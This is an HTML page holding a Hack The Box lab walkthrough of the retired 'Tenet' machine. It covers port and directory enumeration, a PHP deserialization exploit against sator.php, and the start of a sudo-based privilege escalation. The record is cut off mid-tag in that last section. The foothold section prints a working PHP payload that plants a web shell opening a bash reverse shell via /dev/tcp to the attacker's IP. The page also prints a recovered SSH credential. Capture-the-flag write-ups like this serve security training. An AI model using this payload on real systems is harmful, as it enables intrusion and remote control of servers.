@@ -1,0 +1,676 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+
+    <title>Tenet Walkthrough | HTB</title>
+    <meta name="HandheldFriendly" content="True" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <link rel="preload" href="../assets/css/app.css%3Fv=e4011b5a13.css" as="style" />
+    <link rel="preload" href="../assets/js/manifest.js%3Fv=e4011b5a13" as="script" />
+    <link rel="preload" href="../assets/js/vendor/content-api.min.js%3Fv=e4011b5a13" as="script" />
+    <link rel="preload" href="../assets/js/vendor.js%3Fv=e4011b5a13" as="script" />
+    <link rel="preload" href="../assets/js/app.js%3Fv=e4011b5a13" as="script" />
+    <link rel="preconnect" href="https://polyfill.io">
+    <link rel="dns-prefetch" href="https://polyfill.io">
+
+      <link rel="preload" href="../assets/css/post.css%3Fv=e4011b5a13.css" as="style" />
+  <link rel="preload" href="../assets/js/post.js%3Fv=e4011b5a13" as="script" />
+
+
+    <style>
+      /* These font-faces are here to make fonts work if the Ghost instance is installed in a subdirectory */
+
+      /* source-sans-pro-regular */
+      @font-face {
+        font-family: 'Source Sans Pro';
+        font-style: normal;
+        font-weight: 400;
+        font-display: swap;
+        src: local('SourceSansPro-Regular'),
+            url("../assets/fonts/source-sans-pro/latin/source-sans-pro-regular.woff2%3Fv=e4011b5a13") format('woff2'),
+            url("../assets/fonts/source-sans-pro/latin/source-sans-pro-regular.woff%3Fv=e4011b5a13") format('woff');
+      }
+
+      /* source-sans-pro-600 */
+      @font-face {
+        font-family: 'Source Sans Pro';
+        font-style: normal;
+        font-weight: 600;
+        font-display: swap;
+        src: local('SourceSansPro-SemiBold'),
+            url("../assets/fonts/source-sans-pro/latin/source-sans-pro-600.woff2%3Fv=e4011b5a13") format('woff2'),
+            url("../assets/fonts/source-sans-pro/latin/source-sans-pro-600.woff%3Fv=e4011b5a13") format('woff');
+      }
+
+      /* source-sans-pro-700 */
+      @font-face {
+        font-family: 'Source Sans Pro';
+        font-style: normal;
+        font-weight: 700;
+        font-display: swap;
+        src: local('SourceSansPro-Bold'),
+            url("../assets/fonts/source-sans-pro/latin/source-sans-pro-700.woff2%3Fv=e4011b5a13") format('woff2'),
+            url("../assets/fonts/source-sans-pro/latin/source-sans-pro-700.woff%3Fv=e4011b5a13") format('woff');
+      }
+
+      /* iconmoon */
+      @font-face {
+        font-family: 'icomoon';
+        font-weight: normal;
+        font-style: normal;
+        font-display: swap;
+        src: url("../assets/fonts/icomoon/icomoon.eot%3F101fc3%3Fv=e4011b5a13");
+        src: url("../assets/fonts/icomoon/icomoon.eot%3F101fc3") format('embedded-opentype'),
+        url("../assets/fonts/icomoon/icomoon.ttf%3F101fc3%3Fv=e4011b5a13") format('truetype'),
+        url("../assets/fonts/icomoon/icomoon.woff%3F101fc3%3Fv=e4011b5a13") format('woff'),
+        url("../assets/fonts/icomoon/icomoon.svg%3F101fc3") format('svg');
+      }
+    </style>
+
+    <link rel="stylesheet" type="text/css" href="../assets/css/app.css%3Fv=e4011b5a13.css" media="screen" />
+
+      <link rel="stylesheet" type="text/css" href="../assets/css/post.css%3Fv=e4011b5a13.css" media="screen" />
+
+
+    
+
+    <meta name="description" content="This machine is rated as medium, but to get foothold I had to be stuck for one and half hour. The machine contains PHP Object Deserial..." />
+    <link rel="icon" href="../favicon.ico" type="image/x-icon" />
+    <link rel="canonical" href="index.html" />
+    <meta name="referrer" content="no-referrer-when-downgrade" />
+    <link rel="amphtml" href="amp/index.html" />
+    
+    <meta property="og:site_name" content="h4rithd.com" />
+    <meta property="og:type" content="article" />
+    <meta property="og:title" content="Tenet Walkthrough | HTB" />
+    <meta property="og:description" content="This machine is rated as medium, but to get foothold I had to be stuck for one and half hour. The machine contains PHP Object Deserial..." />
+    <meta property="og:url" content="https://h4rithd.com/blog/tenet-walkthrough/" />
+    <meta property="og:image" content="https://h4rithd.com/blog/content/images/2021/06/tenet.jpg" />
+    <meta property="article:published_time" content="2021-06-11T19:00:00.000Z" />
+    <meta property="article:modified_time" content="2021-06-11T21:48:36.000Z" />
+    <meta property="article:tag" content="Retired Machines HTB" />
+    <meta property="article:tag" content="Tenet Walkthrough" />
+    <meta property="article:tag" content="h4rithd" />
+    <meta property="article:tag" content="Harith Dilshan" />
+    
+    <meta property="article:publisher" content="https://www.facebook.com/ShapManasick/" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="Tenet Walkthrough | HTB" />
+    <meta name="twitter:description" content="This machine is rated as medium, but to get foothold I had to be stuck for one and half hour. The machine contains PHP Object Deserial..." />
+    <meta name="twitter:url" content="https://h4rithd.com/blog/tenet-walkthrough/" />
+    <meta name="twitter:image" content="https://h4rithd.com/blog/content/images/2021/06/tenet.jpg" />
+    <meta name="twitter:label1" content="Written by" />
+    <meta name="twitter:data1" content="Harith Dilshan" />
+    <meta name="twitter:label2" content="Filed under" />
+    <meta name="twitter:data2" content="Retired Machines HTB, Tenet Walkthrough, h4rithd, Harith Dilshan" />
+    <meta name="twitter:site" content="@h4rithd" />
+    <meta name="twitter:creator" content="@h4rithd" />
+    <meta property="og:image:width" content="1920" />
+    <meta property="og:image:height" content="1035" />
+    
+    <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "publisher": {
+        "@type": "Organization",
+        "name": "h4rithd.com",
+        "url": "https://h4rithd.com/blog/",
+        "logo": {
+            "@type": "ImageObject",
+            "url": "https://h4rithd.com/blog/content/images/2021/06/Logo.png",
+            "width": 60,
+            "height": 60
+        }
+    },
+    "author": {
+        "@type": "Person",
+        "name": "Harith Dilshan",
+        "image": {
+            "@type": "ImageObject",
+            "url": "https://h4rithd.com/blog/content/images/2021/06/ProfilePic.jpg",
+            "width": 2000,
+            "height": 2000
+        },
+        "url": "https://h4rithd.com/blog/author/h4rithd/",
+        "sameAs": [
+            "https://h4rithd.com/",
+            "https://twitter.com/h4rithd"
+        ]
+    },
+    "headline": "Tenet Walkthrough | HTB",
+    "url": "https://h4rithd.com/blog/tenet-walkthrough/",
+    "datePublished": "2021-06-11T19:00:00.000Z",
+    "dateModified": "2021-06-11T21:48:36.000Z",
+    "image": {
+        "@type": "ImageObject",
+        "url": "https://h4rithd.com/blog/content/images/2021/06/tenet.jpg",
+        "width": 1920,
+        "height": 1035
+    },
+    "keywords": "Retired Machines HTB, Tenet Walkthrough, h4rithd, Harith Dilshan",
+    "description": "Tenet has been retired !!! Well, that part is little dramatic. 😉😉\n\n\n--------------------------------------------------------------------------------\n\nThis machine is rated as medium, but to get foothold I had to be stuck for one\nand half hour. The machine contains PHP Object Deserialization vulnerability and\nalso PrivEsc which is so simple if you can understand the shell codes. Hope you\nwill like it. 😊😊\n\nEnough talks, 🥱 Let’s Get It Started 🐱‍💻\n\n&gt; Disclaimers: No flags (user/root) are sho",
+    "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "https://h4rithd.com/blog/"
+    }
+}
+    </script>
+
+    <meta name="generator" content="Ghost 4.6" />
+    <link rel="alternate" type="application/rss+xml" title="h4rithd.com" href="../rss/index.html" />
+    
+    <link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.16.0/themes/prism-tomorrow.min.css"></link>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.19.0/plugins/toolbar/prism-toolbar.min.css" /><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.19.0/plugins/line-numbers/prism-line-numbers.min.css" />
+<style>
+    pre[class*=language-] {
+        margin: 1.75em 0;
+        font-size: 1.0rem;
+        background: #111;
+    }
+</style>
+<style>
+.m-footer-copyright span:nth-child(2), .m-footer-copyright span:nth-child(3) {
+    display: none;
+}
+</style>
+
+<style>
+blockquote {
+    border-left: 4px solid #3897D3;
+    font-weight: unset;
+    line-height: unset;
+    font-size: 17px;
+    padding-left: 1rem;
+    margin: 1rem 0;
+}
+
+.post-author-image {
+    width: 100%;
+    height: 100%;
+}
+</style<style>:root {--ghost-accent-color: #0065a3;}</style>
+
+    <script>
+      
+    </script>
+  </head>
+  <body class="post-template tag-retired-machines-htb tag-tenet-walkthrough tag-h4rithd tag-harith-dilshan">
+    
+
+
+
+  
+<header class="m-header with-picture js-header">
+  <div class="m-mobile-topbar" data-aos="fade-down">
+    <button class="m-icon-button in-mobile-topbar js-open-menu" aria-label="Open menu">
+      <span class="icon-menu" aria-hidden="true"></span>
+    </button>
+      <a href="../index.html" class="m-logo in-mobile-topbar">
+        <img src="../content/images/2021/06/Logo.png" alt="h4rithd.com">
+      </a>
+    <button class="m-icon-button in-mobile-topbar js-open-search" aria-label="Open search">
+      <span class="icon-search" aria-hidden="true"></span>
+    </button>
+  </div>
+
+  <div class="m-menu js-menu">
+    <button class="m-icon-button outlined as-close-menu js-close-menu" aria-label="Close menu">
+      <span class="icon-close"></span>
+    </button>
+    <div class="m-menu__main" data-aos="fade-down">
+      <div class="l-wrapper">
+        <div class="m-nav js-main-nav">
+          <nav class="m-nav__left js-main-nav-left" role="navigation" aria-label="Main menu">
+            <ul>
+                <li class="only-desktop">
+                  <a href="../index.html" class="m-logo">
+                    <img src="../content/images/2021/06/Logo.png" alt="h4rithd.com">
+                  </a>
+                </li>
+                
+    <li class="nav-me">
+      <a href="https://h4rithd.com/">Me</a>
+    </li>
+    <li class="nav-blog">
+      <a href="https://h4rithd.com/blog/">Blog</a>
+    </li>
+    <li class="nav-starting-point">
+      <a href="https://h4rithd.com/blog/tag/starting-point-htb/">Starting Point</a>
+    </li>
+    <li class="nav-retired-machines">
+      <a href="https://h4rithd.com/blog/tag/retired-machines-htb/">Retired Machines</a>
+    </li>
+
+              <li class="submenu-option js-submenu-option">
+                <button class="m-icon-button in-menu-main more js-toggle-submenu" aria-label="Open submenu">
+                  <span class="icon-more" aria-hidden="true"></span>
+                </button>
+                <div class="m-submenu js-submenu">
+                  <div class="l-wrapper in-submenu">
+                    <section class="m-recent-articles">
+                      <h3 class="m-submenu-title in-recent-articles">Recent articles</h3>
+                          <div class="glide js-recent-slider">
+                            <div class="glide__track" data-glide-el="track">
+                              <div class="glide__slides">
+                                <div class="glide__slide">
+                                  <a href="index.html" class="m-recent-article">
+                                    <div class="m-recent-article__picture ">
+                                        <img src="../content/images/size/w300/2021/06/tenet.jpg" loading="lazy" alt="">
+                                    </div>
+                                    <h3 class="m-recent-article__title js-recent-article-title" title="Tenet Walkthrough">
+                                      Tenet Walkthrough
+                                    </h3>
+                                    <span class="m-recent-article__date">20 hours ago</span>
+                                  </a>
+                                </div>
+                                <div class="glide__slide">
+                                  <a href="../scriptkiddie-walkthrough/index.html" class="m-recent-article">
+                                    <div class="m-recent-article__picture ">
+                                        <img src="../content/images/size/w300/2021/06/ScriptKiddieBG.jpg" loading="lazy" alt="">
+                                    </div>
+                                    <h3 class="m-recent-article__title js-recent-article-title" title="ScriptKiddie Walkthrough">
+                                      ScriptKiddie Walkthrough
+                                    </h3>
+                                    <span class="m-recent-article__date">7 days ago</span>
+                                  </a>
+                                </div>
+                                <div class="glide__slide">
+                                  <a href="../starting-point-htb-base-walkthrough/index.html" class="m-recent-article">
+                                    <div class="m-recent-article__picture ">
+                                        <img src="../content/images/size/w300/2021/06/BaseBG.jpg" loading="lazy" alt="">
+                                    </div>
+                                    <h3 class="m-recent-article__title js-recent-article-title" title="Base Walkthrough">
+                                      Base Walkthrough
+                                    </h3>
+                                    <span class="m-recent-article__date">13 days ago</span>
+                                  </a>
+                                </div>
+                                <div class="glide__slide">
+                                  <a href="../starting-point-htb-markup-walkthrough/index.html" class="m-recent-article">
+                                    <div class="m-recent-article__picture ">
+                                        <img src="../content/images/size/w300/2021/06/MarkupBG.jpg" loading="lazy" alt="">
+                                    </div>
+                                    <h3 class="m-recent-article__title js-recent-article-title" title="Markup Walkthrough">
+                                      Markup Walkthrough
+                                    </h3>
+                                    <span class="m-recent-article__date">14 days ago</span>
+                                  </a>
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                    </section>
+                    <section class="m-tags">
+                      <h3 class="m-submenu-title">Tags</h3>
+                        <ul>
+                            <li>
+                              <a href="../tag/archetype-walkthrough/index.html">Archetype Walkthrough</a>
+                            </li>
+                            <li>
+                              <a href="../tag/base-walkthrough/index.html">Base Walkthrough</a>
+                            </li>
+                            <li>
+                              <a href="../tag/cve-2020-7384/index.html">CVE-2020-7384</a>
+                            </li>
+                            <li>
+                              <a href="../tag/guard-walkthrough/index.html">Guard Walkthrough</a>
+                            </li>
+                            <li>
+                              <a href="../tag/harith-dilshan/index.html">Harith Dilshan</a>
+                            </li>
+                            <li>
+                              <a href="../tag/included-walkthrough/index.html">Included Walkthrough</a>
+                            </li>
+                            <li>
+                              <a href="../tag/markup-walkthrough/index.html">Markup Walkthrough</a>
+                            </li>
+                            <li>
+                              <a href="../tag/oopsie-walkthrough/index.html">Oopsie Walkthrough</a>
+                            </li>
+                            <li>
+                              <a href="../tag/pathfinder-walkthrough/index.html">Pathfinder Walkthrough</a>
+                            </li>
+                            <li>
+                              <a href="../tag/retired-machines-htb/index.html">Retired Machines HTB</a>
+                            </li>
+                        </ul>
+                    </section>
+                  </div>
+                </div>
+              </li>
+            </ul>
+          </nav>
+          <div class="m-nav__right">
+            <button class="m-icon-button in-menu-main js-open-search" aria-label="Open search">
+              <span class="icon-search" aria-hidden="true"></span>
+            </button>
+            <div class="m-toggle-darkmode js-tooltip" data-tippy-content="Toggle dark mode" tabindex="0">
+              <label for="toggle-darkmode" class="sr-only">
+                Toggle dark mode
+              </label>
+              <input id="toggle-darkmode" type="checkbox" class="js-toggle-darkmode">
+              <div>
+                <span class="icon-moon moon" aria-hidden="true"></span>
+                <span class="icon-sunny sun" aria-hidden="true"></span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+
+<main class="main-wrap">
+    
+  <section class="m-hero with-picture" data-aos="fade">
+    <div class="m-hero__picture in-post">
+      <img
+        srcset="../content/images/size/w300/2021/06/tenet.jpg6/tenet.jpg 300w../content/images/size/w600/2021/06/tenet.jpg06/tenet.jpg 600../content/images/size/w1000/2021/06/tenet.jpg/06/tenet.jpg 100../content/images/size/w2000/2021/06/tenet.jpg1/06/tenet.jpg 2000w
+        "
+        sizes="(max-width: 600px) 600px, (max-width: 1000px) 1000px, 2000px"
+        src="../content/images/size/w1000/2021/06/tenet.jpg"
+        alt=""
+      />
+    </div>
+    </section>
+  
+  <article>
+    <div class="l-content in-post">
+        <div class="l-wrapper in-post  js-aos-wrapper" data-aos="fade-up"
+          data-aos-delay="300">
+          <div
+            class="l-post-content js-progress-content">
+            <header class="m-heading">
+              <h1 class="m-heading__title in-post">Tenet Walkthrough</h1>
+              <div class="m-heading__meta">
+                  <a href="../tag/retired-machines-htb/index.html" class="m-heading__meta__tag">Retired Machines HTB</a>
+                  <span class="m-heading__meta__divider" aria-hidden="true">&bull;</span>
+                <span class="m-heading__meta__time">Jun 12, 2021</span>
+              </div>
+            </header>
+            <div class="pos-relative js-post-content">
+              <div class="m-share">
+                <div class="m-share__content js-sticky">
+                  <a href="https://www.facebook.com/sharer/sharer.php?u=https://h4rithd.com/blog/tenet-walkthrough/"
+                    class="m-icon-button filled in-share" target="_blank" rel="noopener" aria-label="Facebook">
+                    <span class="icon-facebook" aria-hidden="true"></span>
+                  </a>
+                  <a href="https://twitter.com/intent/tweet?text=Tenet%20Walkthrough&url=https://h4rithd.com/blog/tenet-walkthrough/"
+                    class="m-icon-button filled in-share" target="_blank" rel="noopener" aria-label="Twitter">
+                    <span class="icon-twitter" aria-hidden="true"></span>
+                  </a>
+                  <button class="m-icon-button filled in-share progress js-scrolltop" aria-label="Scroll to top">
+                    <span class="icon-arrow-top" aria-hidden="true"></span>
+                    <svg aria-hidden="true">
+                      <circle class="progress-ring__circle js-progress" fill="transparent" r="0" />
+                    </svg>
+                  </button>
+                </div>
+              </div>
+              <p>Tenet has been retired !!! Well, that part is little dramatic. 😉😉</p><hr><p>This machine is rated as medium, but to get foothold I had to be stuck for one and half hour. The machine contains PHP Object Deserialization vulnerability and also PrivEsc which is so simple if you can understand the shell codes. Hope you will like it. 😊😊</p><p>Enough talks, 🥱 Let’s Get It Started 🐱‍💻</p><blockquote><strong>Disclaimers: </strong>No flags (user/root) are shown in this writeup (as in usual writeups), so follow the procedure to grab the flags! 🐱‍👤</blockquote><!--kg-card-begin: html--><script src="https://apps.elfsight.com/p/platform.js" defer></script>
+<div class="elfsight-app-a4de7430-6c0c-44b8-aada-9b9ac759e396"></div><!--kg-card-end: html--><hr><h2 id="01-enumeration">01 Enumeration</h2><p>First of all I will check the status of my VPN connection and whether the machine is alive or not. To do that we can simply ping to the IP address like this 👇👇</p><figure class="kg-card kg-image-card"><img src="../content/images/2021/06/image-296.png" class="kg-image" alt loading="lazy" width="1454" height="554" srcset="../content/images/size/w600/2021/06/image-296.png 600w, ../content/images/size/w1000/2021/06/image-296.png 1000w, ../content/images/2021/06/image-296.png 1454w" sizes="(min-width: 720px) 720px"></figure><p>As you can see here, the <strong>TTL value is 63</strong>. That implies this machine is Linux.</p><p>As we did every time, let's begin with Nmap. For that I need to know which ports are open. So, run fast scan for all TCP ports.</p><pre><code class="language-bash">nmap -n -vv --open -T4 -p- -oN AllPorts.nmap 10.10.10.223 </code></pre><p>Here is the output 👇👇</p><figure class="kg-card kg-image-card"><img src="../content/images/2021/06/image-297.png" class="kg-image" alt loading="lazy" width="1654" height="1106" srcset="../content/images/size/w600/2021/06/image-297.png 600w, ../content/images/size/w1000/2021/06/image-297.png 1000w, ../content/images/size/w1600/2021/06/image-297.png 1600w, ../content/images/2021/06/image-297.png 1654w" sizes="(min-width: 720px) 720px"></figure><p>So, there are only two open ports. 🤔🤔</p><h3 id="011-run-nmap-scripting-engine">01.1 Run Nmap Scripting Engine</h3><p>To get the best result, we can run the <code>Nmap Scripting Engine</code> for all open ports. Now we know all of the open ports and therefore, we can point out and run the script engine as fast as possible.</p><pre><code class="language-bash">nmap -sV -sC -oN DetailPorts.nmap -p 22,80 10.10.10.223</code></pre><figure class="kg-card kg-image-card"><img src="../content/images/2021/06/image-298.png" class="kg-image" alt loading="lazy" width="1934" height="922" srcset="../content/images/size/w600/2021/06/image-298.png 600w, ../content/images/size/w1000/2021/06/image-298.png 1000w, ../content/images/size/w1600/2021/06/image-298.png 1600w, ../content/images/2021/06/image-298.png 1934w" sizes="(min-width: 720px) 720px"></figure><p>By looking at the SSH service info, we can definitely say that the Operating System is <strong>Ubuntu </strong>and  <a href="https://launchpad.net/ubuntu/+source/openssh/1:7.6p1-4ubuntu0.3" rel="noopener noreferrer">launchpad</a> information shows us the flavor is <strong>Bionic Beaver </strong>🐿🐿</p><p>So as usual, there is a webserver running on port 80. First, I will choose that port to go on further enumerations. Open whatever web browser you like and navigate to <em>http://10.10.10.223/</em></p><figure class="kg-card kg-image-card"><img src="../content/images/2021/06/image-299.png" class="kg-image" alt loading="lazy" width="1717" height="911" srcset="../content/images/size/w600/2021/06/image-299.png 600w, ../content/images/size/w1000/2021/06/image-299.png 1000w, ../content/images/size/w1600/2021/06/image-299.png 1600w, ../content/images/2021/06/image-299.png 1717w" sizes="(min-width: 720px) 720px"></figure><p>You can see here that it is a default apache index page. Well, then we need brute force directories to identify if there are any other endpoints. I used to use <a href="https://github.com/maurosoria/dirsearch" rel="noopener noreferrer">dirsearch</a> tool before, but right now I'm using <a href="https://github.com/ffuf/ffuf" rel="noopener noreferrer">ffuf</a> tool because it has more power than other tools. In addition to doing directory brute force, we can also use this for credentials brute force and subdomain discovery.</p><p>Use following command for brute force directories. 👇👇</p><pre><code class="language-bash">ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://10.10.10.223/FUZZ</code></pre><figure class="kg-card kg-image-card"><img src="../content/images/2021/06/image-300.png" class="kg-image" alt loading="lazy" width="2000" height="1106" srcset="../content/images/size/w600/2021/06/image-300.png 600w, ../content/images/size/w1000/2021/06/image-300.png 1000w, ../content/images/size/w1600/2021/06/image-300.png 1600w, ../content/images/2021/06/image-300.png 2196w" sizes="(min-width: 720px) 720px"></figure><p>And we found one valid endpoint called <code>wordpress</code> . Let's navigate to that endpoint.</p><figure class="kg-card kg-image-card"><img src="../content/images/2021/06/image-301.png" class="kg-image" alt loading="lazy" width="1519" height="665" srcset="../content/images/size/w600/2021/06/image-301.png 600w, ../content/images/size/w1000/2021/06/image-301.png 1000w, ../content/images/2021/06/image-301.png 1519w" sizes="(min-width: 720px) 720px"></figure><p>This is what I got. Let's take a moment to look at the source code. Press <code>ctrl + u</code></p><figure class="kg-card kg-image-card"><img src="../content/images/2021/06/image-302.png" class="kg-image" alt loading="lazy" width="1429" height="232" srcset="../content/images/size/w600/2021/06/image-302.png 600w, ../content/images/size/w1000/2021/06/image-302.png 1000w, ../content/images/2021/06/image-302.png 1429w" sizes="(min-width: 720px) 720px"></figure><pre><code class="language-bash">echo -e "10.10.10.223\ttenet.htb" &gt;&gt; /etc/hosts</code></pre><figure class="kg-card kg-image-card"><img src="../content/images/2021/06/image-303.png" class="kg-image" alt loading="lazy" width="1108" height="332" srcset="../content/images/size/w600/2021/06/image-303.png 600w, ../content/images/size/w1000/2021/06/image-303.png 1000w, ../content/images/2021/06/image-303.png 1108w" sizes="(min-width: 720px) 720px"></figure><p>And then navigate to the <strong>http://tenet.htb/</strong></p><figure class="kg-card kg-image-card"><img src="../content/images/2021/06/image-304.png" class="kg-image" alt loading="lazy" width="1712" height="843" srcset="../content/images/size/w600/2021/06/image-304.png 600w, ../content/images/size/w1000/2021/06/image-304.png 1000w, ../content/images/size/w1600/2021/06/image-304.png 1600w, ../content/images/2021/06/image-304.png 1712w" sizes="(min-width: 720px) 720px"></figure><p>After doing some searching around the page, I found some interesting thing like this. 👇👇</p><figure class="kg-card kg-image-card"><img src="../content/images/2021/06/image-305.png" class="kg-image" alt loading="lazy" width="796" height="294" srcset="../content/images/size/w600/2021/06/image-305.png 600w, ../content/images/2021/06/image-305.png 796w" sizes="(min-width: 720px) 720px"></figure><figure class="kg-card kg-image-card"><img src="../content/images/2021/06/image-306.png" class="kg-image" alt loading="lazy" width="724" height="280" srcset="../content/images/size/w600/2021/06/image-306.png 600w, ../content/images/2021/06/image-306.png 724w" sizes="(min-width: 720px) 720px"></figure><p>With that point I had to get stuck for an hour and a half to find the next step.</p><p>Finally, here is another subdomain called <code>sator.tenet.htb</code> . Edit your host file again. 👇👇</p><pre><code class="language-bash">echo -e "10.10.10.223\tsator.tenet.htb" &gt;&gt; /etc/hosts</code></pre><figure class="kg-card kg-image-card"><img src="../content/images/2021/06/image-307.png" class="kg-image" alt loading="lazy" width="1456" height="370" srcset="../content/images/size/w600/2021/06/image-307.png 600w, ../content/images/size/w1000/2021/06/image-307.png 1000w, ../content/images/2021/06/image-307.png 1456w" sizes="(min-width: 720px) 720px"></figure><p>Don't be lazy 🤓 now navigate to the <code>sator.tenet.htb</code></p><figure class="kg-card kg-image-card"><img src="../content/images/2021/06/image-308.png" class="kg-image" alt loading="lazy" width="1710" height="800" srcset="../content/images/size/w600/2021/06/image-308.png 600w, ../content/images/size/w1000/2021/06/image-308.png 1000w, ../content/images/size/w1600/2021/06/image-308.png 1600w, ../content/images/2021/06/image-308.png 1710w" sizes="(min-width: 720px) 720px"></figure><p>Ah ha! 💡 I know how the game is like now based on Neil's comment which we met earlier. Therefore navigate again <code>http://sator.tenet.htb/sator.php</code></p><figure class="kg-card kg-image-card"><img src="../content/images/2021/06/image-309.png" class="kg-image" alt loading="lazy" width="551" height="165"></figure><p>Neil is talking about the backup file. Okay then, let's check <code>sator.php.bak</code></p><figure class="kg-card kg-image-card"><img src="../content/images/2021/06/image-310.png" class="kg-image" alt loading="lazy" width="906" height="529" srcset="../content/images/size/w600/2021/06/image-310.png 600w, ../content/images/2021/06/image-310.png 906w" sizes="(min-width: 720px) 720px"></figure><p>Yeah! 🙌 we have the backup file now. Let's download that file to our host machine and try to open that file.</p><pre><code class="language-bash">wget http://sator.tenet.htb/sator.php.bak</code></pre><figure class="kg-card kg-image-card"><img src="../content/images/2021/06/image-311.png" class="kg-image" alt loading="lazy" width="1940" height="662" srcset="../content/images/size/w600/2021/06/image-311.png 600w, ../content/images/size/w1000/2021/06/image-311.png 1000w, ../content/images/size/w1600/2021/06/image-311.png 1600w, ../content/images/2021/06/image-311.png 1940w" sizes="(min-width: 720px) 720px"></figure><figure class="kg-card kg-image-card"><img src="../content/images/2021/06/image-312.png" class="kg-image" alt loading="lazy" width="1782" height="1324" srcset="../content/images/size/w600/2021/06/image-312.png 600w, ../content/images/size/w1000/2021/06/image-312.png 1000w, ../content/images/size/w1600/2021/06/image-312.png 1600w, ../content/images/2021/06/image-312.png 1782w" sizes="(min-width: 720px) 720px"></figure><p>Damn it.😩 There is PHP deserialization vulnerability. In fact, I'm very weak when it comes PHP deserialization. Somehow, by analyzing the source code and using following articles, I was able to create the payload and it works.😁😁</p><ul><li><a href="https://medium.com/swlh/exploiting-php-deserialization-56d71f03282a" rel="noopener noreferrer">Exploiting PHP deserialization.</a></li><li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Files/PHP-Serialization-RCE-Exploit.php" rel="noopener noreferrer">PHP Serialization RCE Exploit</a></li></ul><figure class="kg-card kg-image-card"><img src="../content/images/2021/06/image-313.png" class="kg-image" alt loading="lazy" width="600" height="283" srcset="../content/images/2021/06/image-313.png 600w"></figure><hr><h2 id="02-foothold">02. Foothold</h2><p>The payload will look like this. 👇👇 Change <strong>YourIP</strong> as yours.</p><pre><code class="language-bash">&lt;?php
+
+class DatabaseExport {
+  public $user_file = 'h4rithd.php';
+  public $data = '&lt;?php exec("/bin/bash -c \'bash -i &gt; /dev/tcp/&lt;YourIP&gt;/4545 0&gt;&amp;1\'"); ?&gt;';
+  }
+
+$payload = 'http://sator.tenet.htb/sator.php?arepo='.urlencode(serialize(new DatabaseExport));
+
+system('curl '.$payload);
+system('curl http://sator.tenet.htb/h4rithd.php');
+
+?&gt;</code></pre><figure class="kg-card kg-image-card"><img src="../content/images/2021/06/image-314.png" class="kg-image" alt loading="lazy" width="1988" height="700" srcset="../content/images/size/w600/2021/06/image-314.png 600w, ../content/images/size/w1000/2021/06/image-314.png 1000w, ../content/images/size/w1600/2021/06/image-314.png 1600w, ../content/images/2021/06/image-314.png 1988w" sizes="(min-width: 720px) 720px"></figure><p>Now power up netcat listener and listen to port 4545. After that, we can run the above payload by typing <code>php payload.php</code> on the terminal. Then you will land on a reverse shell as user <code>www-data</code> 🤤🤤</p><figure class="kg-card kg-image-card"><img src="../content/images/2021/06/image-315.png" class="kg-image" alt loading="lazy" width="1509" height="270" srcset="../content/images/size/w600/2021/06/image-315.png 600w, ../content/images/size/w1000/2021/06/image-315.png 1000w, ../content/images/2021/06/image-315.png 1509w" sizes="(min-width: 720px) 720px"></figure><p>OK! Now you will find a way to escalate the privilege's in order to read the user flag by doing some quick enumerations on wordpress directory.</p><figure class="kg-card kg-image-card"><img src="../content/images/2021/06/image-316.png" class="kg-image" alt loading="lazy" width="1600" height="442" srcset="../content/images/size/w600/2021/06/image-316.png 600w, ../content/images/size/w1000/2021/06/image-316.png 1000w, ../content/images/2021/06/image-316.png 1600w" sizes="(min-width: 720px) 720px"></figure><p>In the <code>wp-config.php</code> file, disclose the credentials for user neil. <code>neil : Opera2112</code></p><figure class="kg-card kg-image-card"><img src="../content/images/2021/06/image-317.png" class="kg-image" alt loading="lazy" width="1332" height="516" srcset="../content/images/size/w600/2021/06/image-317.png 600w, ../content/images/size/w1000/2021/06/image-317.png 1000w, ../content/images/2021/06/image-317.png 1332w" sizes="(min-width: 720px) 720px"></figure><p>Now we can use the ☝ above credentials to login as user <code>neil</code> via SSH. Then you have the user.txt.</p><figure class="kg-card kg-image-card"><img src="../content/images/2021/06/image-318.png" class="kg-image" alt loading="lazy" width="1772" height="1324" srcset="../content/images/size/w600/2021/06/image-318.png 600w, ../content/images/size/w1000/2021/06/image-318.png 1000w, ../content/images/size/w1600/2021/06/image-318.png 1600w, ../content/images/2021/06/image-318.png 1772w" sizes="(min-width: 720px) 720px"></figure><hr><h2 id="03-privilege-escalation">03. Privilege Escalation</h2><p>For privilege escalation, usually I run the <code>sudo-l</code> command first to know what commands we can run as super user without prompting the super user password.</p><figure class="kg-card kg-image-card"><img src="../content/images/2021/06/image-319.png" class="kg-image" alt loading="lazy" width="1730" height="478" srcset="../content/images/size/w600/2021/06/image-319.png 600w, ../content/images/size/w1000/2021/06/image-319.png 1000w, ../content/images/size/w1600/2021/06/image-319.png 1600w, ../content/images/2021/06/image-319.png 1730w" sizes="(min-width: 720px) 720px"></figure><p>As shown, there is a bash file located in <code>/usr/local/bin/enableSSH.sh</code> Let's check the file permission first.</p><pre><code class="language-bash">ls -al /usr/local/bin/enableSSH.sh</code></pre><figure class="kg-card kg-image-card"><img src="../content/images/2021/06/image-320.png" class="kg-image" alt loading="lazy" width="1510" height="294" srcset="../content/images/size/w600/2021/06/image-320.png 600w, ../content/images/size/w1000/2021/06/image-320.png 1000w, ../content/images/2021/06/image-320.png 1510w" sizes="(min-width: 720px) 720px"></figure><p>We have permission only to <code>read and execute</code>  on this file. Let's check what's inside that file. 🧐</p><figure class="kg-card kg-image-card"><img src="../content/images/2021/06/image-321.png" class="kg-image" alt loading="lazy" width="2000" height="1292" srcset="../content/images/size/w600/2021/06/image-321.png 600w, ../content/images/size/w1000/2021/06/image-321.png 1000w, ../content/images/size/w1600/2021/06/image-321.png 1600w, ../content/images/2021/06/image-321.png 2334w" 